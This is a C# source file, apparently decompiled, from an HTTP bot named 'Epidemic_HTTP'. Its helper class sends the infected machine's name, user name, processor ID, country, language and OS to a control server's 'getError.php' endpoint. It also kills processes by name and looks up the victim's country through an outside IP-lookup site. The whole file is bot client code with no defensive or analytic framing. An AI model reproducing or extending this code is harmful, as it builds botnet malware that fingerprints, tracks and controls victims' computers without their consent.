using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using System.Threading;
using System.Web;

namespace Epidemic_HTTP;

internal class Functions
{
	private static Random random = new Random((int)DateTime.Now.Ticks);

	public static void ReportError(string method, string error_message, string stack_trace)
	{
		new Flags();
		string text = Config.http_dir + "getError.php?compname=" + HttpUtility.UrlEncode(Environment.MachineName) + "&compuser=" + HttpUtility.UrlEncode(Environment.UserName) + "&hwid=" + HttpUtility.UrlEncode(GetProcessorID()) + "&country=" + HttpUtility.UrlEncode(getCountryCode()) + "&complang=" + getComputerLanguage() + "&os=" + HttpUtility.UrlEncode(GetOperatingSystem()) + "&version=" + HttpUtility.UrlEncode(Config.bot_version.ToString()) + "&method=" + HttpUtility.UrlEncode(method) + "&errmsg=" + HttpUtility.UrlEncode(error_message) + "&stacktrace=" + HttpUtility.UrlEncode(stack_trace.Replace(Environment.NewLine, "<br />"));
		Console.WriteLine(text);
		GetWebpageContents(text);
	}

	public static bool FindAndKillProcess(string name)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.StartsWith(name))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		process.Kill();
		return true;
	}

	public static string GetMethodName(string message)
	{
		try
		{
			return string.Format(message, new StackFrame(1).GetMethod()!.Name);
		}
		catch
		{
			return null;
		}
	}

	public static string RandomString(int size, bool lowerCase)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < size; i++)
			{
				char value = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * random.NextDouble() + 65.0)));
				stringBuilder.Append(value);
			}
			if (lowerCase)
			{
				return stringBuilder.ToString().ToLower();
			}
			return stringBuilder.ToString();
		}
		catch (Exception ex)
		{
			ReportError(GetMethodName("{0}"), ex.Message, ex.StackTrace);
			return null;
		}
	}

	public static string[] GetStringInBetween(string strBegin, string strEnd, string strSource, bool includeBegin, bool includeEnd)
	{
		try
		{
			string[] array = new string[2] { "", "" };
			int num = strSource.IndexOf(strBegin);
			if (num != -1)
			{
				if (includeBegin)
				{
					num -= strBegin.Length;
				}
				strSource = strSource.Substring(num + strBegin.Length);
				int num2 = strSource.IndexOf(strEnd);
				if (num2 != -1)
				{
					if (includeEnd)
					{
						num2 += strEnd.Length;
					}
					array[0] = strSource.Substring(0, num2);
					if (num2 + strEnd.Length < strSource.Length)
					{
						array[1] = strSource.Substring(num2 + strEnd.Length);
					}
				}
			}
			else
			{
				array[1] = strSource;
			}
			return array;
		}
		catch (Exception ex)
		{
			ReportError(GetMethodName("{0}"), ex.Message, ex.StackTrace);
			return null;
		}
	}

	public static string GetOperatingSystem()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			string result = "Unknown";
			switch (oSVersion.Platform)
			{
			case PlatformID.Win32Windows:
				switch (oSVersion.Version.Minor)
				{
				case 90:
					result = "Windows ME";
					break;
				case 10:
					result = "Windows 98";
					break;
				case 0:
					result = "Windows 95";
					break;
				}
				break;
			case PlatformID.Win32NT:
				switch (oSVersion.Version.Major)
				{
				case 3:
					result = "Windws NT 3.51";
					break;
				case 4:
					result = "Windows NT 4";
					break;
				case 5:
					if (oSVersion.Version.Minor == 0)
					{
						result = "Windows 2000";
					}
					else if (oSVersion.Version.Minor == 1)
					{
						result = "Windows XP";
					}
					else if (oSVersion.Version.Minor == 2)
					{
						result = "Windows Server 2003";
					}
					break;
				case 6:
					result = "Windows Vista";
					if (oSVersion.Version.Minor == 0)
					{
						result = "Windows Vista";
					}
					else if (oSVersion.Version.Minor == 1)
					{
						result = "Windows 7";
					}
					break;
				}
				break;
			}
			return result;
		}
		catch (Exception ex)
		{
			ReportError(GetMethodName("{0}"), ex.Message, ex.StackTrace);
			return null;
		}
	}

	public static string getComputerLanguage()
	{
		try
		{
			return Thread.CurrentThread.CurrentCulture.Name;
		}
		catch (Exception ex)
		{
			ReportError(GetMethodName("{0}"), ex.Message, ex.StackTrace);
			return null;
		}
	}

	public static string getCountryCode()
	{
		try
		{
			return GetStringInBetween("<br><b>My IP Country Code</b>:&nbsp;&nbsp;", "&nbsp;&nbsp;", GetWebpageContents("http://www.find-ip-address.org/"), includeBegin: false, includeEnd: false)[0];
		}
		catch
		{
			return "UNK";
		}
	}

	public static string GetProcessorID()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		try
		{
			string result = "";
			string text = "SELECT ProcessorId FROM Win32_Processor";
			ManagementObjectSearcher val = new ManagementObjectSearcher(text);
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					result = (string)((ManagementBaseObject)val3).get_Item("ProcessorId");
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception ex)
		{
			ReportError(GetMethodName("{0}"), ex.Message, ex.StackTrace);
			return null;
		}
	}

	public static string GetWebpageContents(string url)
	{
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			return new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		}
		catch (Exception ex)
		{
			ReportError(GetMethodName("{0}"), ex.Message, ex.StackTrace);
			return null;
		}
	}
}
